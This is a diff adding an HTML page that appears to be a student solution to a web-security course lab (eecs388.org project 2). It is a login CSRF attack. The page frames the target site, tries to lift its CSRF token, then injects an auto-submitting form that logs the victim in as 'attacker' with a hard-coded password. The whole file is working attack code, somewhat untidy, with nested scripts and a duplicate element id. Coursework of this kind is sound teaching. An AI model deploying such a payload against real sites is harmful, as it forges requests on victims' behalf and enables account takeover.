@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+</head>
+<body>
+	<iframe src="https://eecs388.org/project2/" id="ifr" height="600" width="800">
+		<p id="csrf_token" style="display:none"></p>
+		<script type="text/javascript">
+			$(document).ready(function(){
+				var csrf_token_val = $('form.form-inline').children('input').val();
+				console.log("hi");
+				console.log(csrf_token_val);
+				$("#csrf_token").text(csrf_token_val);
+			});
+		</script>
+		<iframe srcdoc="" id="ifr" style="display:none"></iframe>
+		<button>Press</button>
+		<script>
+		$(document).ready(function(){
+			$("button").click(function() {
+				var csrf_token_val = $("#csrf_token").text(); //"228916cf3daf26d299fbb2f828f4f736";
+				var form_injection = "<form action='https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0' method='post' id='formid'><input type='hidden' name='csrf_token' value='" + csrf_token_val + "'><input type='text' name='username' value='attacker'><input type='text' name='password' value='l33th4x'></form><script>document.getElementById('formid').submit();</scr" + "ipt>";
+				$("#ifr").attr("srcdoc", form_injection);
+			});
+		});
+		</script>
+	</iframe>
+</body>
+</html>
